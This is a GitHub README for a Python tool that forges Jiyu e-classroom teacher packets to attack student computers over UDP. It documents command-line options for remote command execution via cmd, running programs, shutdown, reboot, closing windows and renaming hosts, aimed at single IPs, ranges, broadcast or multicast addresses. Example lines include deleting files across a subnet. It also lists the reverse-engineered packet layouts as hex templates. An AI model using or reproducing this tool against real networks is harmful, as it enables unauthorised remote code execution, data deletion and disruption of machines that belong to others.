# Jiyu_udp_attack

[![GitHub release](https://img.shields.io/github/release/weilycoder/Jiyu_udp_attack.svg)](https://github.com/weilycoder/Jiyu_udp_attack/releases/latest)

利用极域电子教室的 udp 包攻击学生机。

对这方面技术的了解来自 [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack/)。

## Environment

项目的最新版向下兼容到 Python 3.8。

## Usage

你可以从 Python 导入 `Jiyu_udp_attack` 模块，也可以使用命令行 `python Jiyu_udp_attack`。

使用 `python Jiyu_udp_attack -h` 来获取帮助信息：

```
usage: Jiyu_udp_attack [-h] [-f <ip>] [-fp <port>] -t <ip> [-tp <port>]
                       [-i <ip_id>] (-m <msg> | -w <url> | -c <command> |
                       -e <program> [<args> ...] |
                       -s [<timeout> [<message> ...]] |
                       -r [<timeout> [<message> ...]] |
                       -cw [<timeout> [<message> ...]] | -ctw |
                       -n <name> <name_id> | --hex <hex_data> |
                       --pkg <custom_data> [<args> ...])

Jiyu Attack Script

Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ 

options:
  -h, --help            show this help message and exit

Network Configuration:
  Specify the network configuration for the attack.

  -f, --teacher-ip <ip>
                        Teacher's IP address
  -fp, --teacher-port <port>
                        Teacher's port (default to random port)
  -t, --target <ip>     Target IP address
  -tp, --target-port <port>
                        Port to send packets to (default: 4705)
  -i, --ip-id <ip_id>   IP ID for the packet (default: random ID)

Attack Action:
  Specify the action to perform on the target machine. 

  -m, --message <msg>   Send a message to the target machine
  -w, --website <url>   Open a website on the target machine
  -c, --command <command>
                        Execute a command on the target machine
                        (`cmd /D /C <command>`, Windows only)
  -e, --execute, --minimize-execute, --maximize-execute <program> [<args> ...]
                        Execute a program with arguments on the target machine
  -s, --shutdown [<timeout> [<message> ...]]
                        Shutdown the target machine,
                        optionally with a timeout and message
  -r, --reboot [<timeout> [<message> ...]]
                        Reboot the target machine,
                        optionally with a timeout and message
  -cw, --close-windows [<timeout> [<message> ...]]
                        Close all windows on the target machine
  -ctw, --close-top-window
                        Close the top window on the target machine
  -n, --rename <name> <name_id>
                        Rename the target machine
  --hex <hex_data>      Send raw hex data to the target machine
  --pkg <custom_data> [<args> ...]
                        Custom packet data to send

Example usage:
    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"
    python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com
    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
    python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe
    python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe
    python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."
    python Jiyu_udp_attack -t 192.168.106.105-120 -r 30 "Rebooting."
    python Jiyu_udp_attack -t 192.168.106.255 -cw
    python Jiyu_udp_attack -t 192.168.106.100 -ctw
    python Jiyu_udp_attack -t 192.168.106.100 -n hacker 1000
    python Jiyu_udp_attack -t 192.168.106.100 --hex 444d4f43000001002a020000
    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{rand16.size_2}"
    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0.int.little_4}" 1024
    python Jiyu_udp_attack -t 192.168.106.100 --pkg ":{0}{1.size_800}" 4d hello
    python Jiyu_udp_attack -t 192.168.106.100 --pkg test.txt 1024 hello
```

---

其中目标 ip 的指定，可以：

+ 指定具体 ip，如 `192.168.3.103`；
+ 指定 ip 范围，如 `192.168.3.100-150`。

最多指定 65536 个不同 ip。

但是，更推荐的行为是：

+ 指定广播地址，如 `192.168.3.255`；
+ 指定 ip 段，如 `192.168.3.0/24`，这将被转换到广播地址 `192.168.3.255`；
+ 使用极域的组播地址 `224.50.50.42`。

---

`--pkg` 用于发送格式化的数据包，可以指定参数，首个参数作为格式化字符串，其余参数被应用于字符串的格式化。格式化字符串的内容为 16 进制编码的数据包，因此需要保证应用格式化后字符串为合法的 16 进制编码串。

处理时使用了自定义的类型包装参数，定义了 `HexInt` 和 `HexStr` 两个类型，输入的参数均作为 `HexStr`；此外，还定义了 `rand16` 作为可用变量。

目前支持的属性包括（以位置 `0` 为例）：

- `HexInt`
  + `{0}`：直接输出十进制数字，无前导零。
  + `{0.big_<size>}`：将数转为 `<size>` 位字节，大端序编码；
  + `{0.little_<size>}`：将数转为 `<size>` 位字节，小端序编码；
  + `{0.add_<value>}`：将数加 `<value>`；
  + `{0.sub_<value>}`：将数减 `<value>`，请注意 `HexInt` 不支持负数；
  + `{0.mul_<value>}`：将数乘 `<value>`；
  + `{0.div_<value>}`：将数整除 `<value>`；
  + `{0.mod_<value>}`：将数对 `<value>` 取模。
- `HexStr`
  + `{0}`：直接输出字符串本身，因此此时应保证字符串为 16 进制码；
  + `{0.len}`：返回字符串的长度；
  + `{0.hex}`：将字符串转化为 `utf-16le` 编码；
  + `{0.int}`：将字符串解释为数；
  + `{0.int_<base>}`：将字符串解释为 `<base>` 进制数；
  + `{0.size_<size>}`：将字符串转化为 `utf-16le` 编码，并填充 `\x00` 到 `<size>` 位，若超过 `<size>` 位则报错。
- `rand16`
  + `{rand16}`：生成一个随机字节；
  + `{rand16.size_<size>}`：生成 `<size>` 个随机字节。

注意，`rand16` 的返回值为 `str`，而非 `HexStr`。

## Jiyu API

记录抓包得到的极域 udp 包格式。

不记录包头信息，只记录 Data 格式。

子标题名是我自己起的。

### Message

用于教师端向学生端发送信息。

Data 区长 $954$。

| 长度  |                            内容                            |
| :---: | :--------------------------------------------------------: |
| $12$  |                 `444d4f43000001009e030000`                 |
| $16$  |                        随机二进制串                        |
| $28$  | `204e0000c0a86c019103000091030000000800000000000005000000` |
| $800$ |               信息内容，使用 `utf-16le` 编码               |
| $98$  |                  全 $0$ 段，可能是保留区                   |

### Rename

Data 区长 $96$。

| 长度 |                            内容                            |
| :--: | :--------------------------------------------------------: |
| $28$ | `47434d4e000001004400000066b1e4923f9a364a943a3da3bd976041` |
| $4$  |              *ID*，需要大于上一次提供的 *ID*               |
| $64$ |        新名称，以 `\x00` 结尾，使用 `utf-16le` 编码        |

由于新名称的结尾以 `\x00` 标记，因此在结尾后可以加入其他数据，不影响识别，也没有副作用。

注意，结尾标记 `\x00` 经 `utf-16le` 编码后变为 `\x00\x00`。

如果提供一个较大的 *ID*，会使教师端的重命名消息不在学生端提示。

### Execute

用于教师端在学生端远程执行命令。

Data 区长 $906$。

| 长度  |                             内容                             |
| :---: | :----------------------------------------------------------: |
| $12$  |                  `444d4f43000001006e030000`                  |
| $16$  |                         随机二进制串                         |
| $32$  | `204e0000c0a8e901610300006103000000020000000000000f00000001000000` |
| $512$ |             可执行程序位置，使用 `utf-16le` 编码             |
| $254$ |                执行参数，使用 `utf-16le` 编码                |
| $66$  |                          全 $0$ 段                           |
|  $1$  |       正常启动 `00`；最小化启动 `01`；最大化启动 `02`        |
| $13$  |                 `00000001000000000000000000`                 |

另外，脚本的 `-c` 功能实际上是使用参数 `f'/D /C "{args.command}"'` 打开程序 `CMD.exe`，这里参数使用 Python 的字符串格式化语法表示。

### Website

用于教师端在学生端远程打开网站。

Data 区变长，至少 $64$ 个字节。

|      长度       |                内容                |
| :-------------: | :--------------------------------: |
|       $8$       |         `444d4f4300000100`         |
|       $4$       |   $\mathrm{size}+36$，小端序编码   |
|      $16$       |            随机二进制串            |
|       $8$       |         `204e0000c0a8e901`         |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|       $4$       |   $\mathrm{size}+23$，小端序编码   |
|      $16$       | `00020000000000001800000000000000` |
| $\mathrm{size}$ |     网址，使用 `utf-16le` 编码     |
|       $4$       |             全 $0$ 段              |

### Reboot / Shutdown

用于重启/关闭学生机。

Data 区长 $582$。

| 长度  |                        内容                        |
| :---: | :------------------------------------------------: |
| $12$  |             `444d4f43000001002a020000`             |
| $16$  |                    随机二进制串                    |
| $24$  | `204e0000c0a8e9011d0200001d0200000002000000000000` |
|  $2$  |              重启 `1300`；关闭 `1400`              |
|  $2$  |          立即执行 `0010`；应用超时 `0000`          |
|  $4$  |                超时时间，小端序编码                |
|  $8$  |                 `0100000000000000`                 |
| $256$ |             提示信息，`utf-16le` 编码              |
| $258$ |                     全 $0$ 段                      |

### Close-Windows

用于关闭学生端所有窗口，与 Reboot / Shutdown 高度相似。

Data 区长 $582$。

| 长度  |                        内容                        |
| :---: | :------------------------------------------------: |
| $12$  |             `444d4f43000001002a020000`             |
| $16$  |                    随机二进制串                    |
| $24$  | `204e0000c0a8e9011d0200001d0200000002000000000000` |
|  $2$  |                       `0200`                       |
|  $2$  |          立即执行 `0010`；应用超时 `0000`          |
|  $4$  |                超时时间，小端序编码                |
|  $8$  |                 `0100000000000000`                 |
| $256$ |             提示信息，`utf-16le` 编码              |
| $258$ |                     全 $0$ 段                      |

### Close-Top-Window

Data 区长 $906$。

| 长度  |                            内容                            |
| :---: | :--------------------------------------------------------: |
| $12$  |                 `444d4f43000001006e030000`                 |
| $16$  |                        随机二进制串                        |
| $28$  | `204e0000c0a8019b610300006103000000020000000000000e000000` |
| $850$ |                         全 $0$ 段                          |

最后的全 $0$ 段似乎在不同教师端上不同，但经试验可以全填 $0$。

## License

MIT 协议。
